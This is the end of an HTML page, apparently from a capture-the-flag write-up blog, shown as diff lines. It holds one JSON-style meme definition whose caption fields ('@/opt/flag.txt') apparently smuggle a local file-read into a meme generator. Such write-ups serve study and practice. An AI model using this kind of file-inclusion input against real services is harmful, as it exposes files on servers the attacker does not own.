+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">version:</span> <span style="color:#f92672">&#34;MDL/1.1&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">type:</span> <span style="color:#f92672">&#34;meme&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">base:</span> <span style="color:#960050;background-color:#1e0010">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#960050;background-color:#1e0010">format:</span> <span style="color:#f92672">&#34;Meme.DrakeYesNo&#34;</span>
+</span></span><span style="display:flex;"><span>    }<span style="color:#960050;background-color:#1e0010">,</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">caption:</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#960050;background-color:#1e0010">topText:</span> <span style="color:#f92672">&#34;@/opt/flag.txt&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#960050;background-color:#1e0010">bottomText:</span> <span style="color:#f92672">&#34;/opt/flag.txt&#34;</span>,
+</span></span><span style="display:flex;"><span>    }<span style="color:#960050;background-color:#1e0010">,</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}</span>
+</span></span></code></pre></div>
+      </div></div>
+
+  
+
+  
+  
+
+  
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>© R* 2022</span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="assets/main.js"></script>
+<script src="assets/prism.js"></script>
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
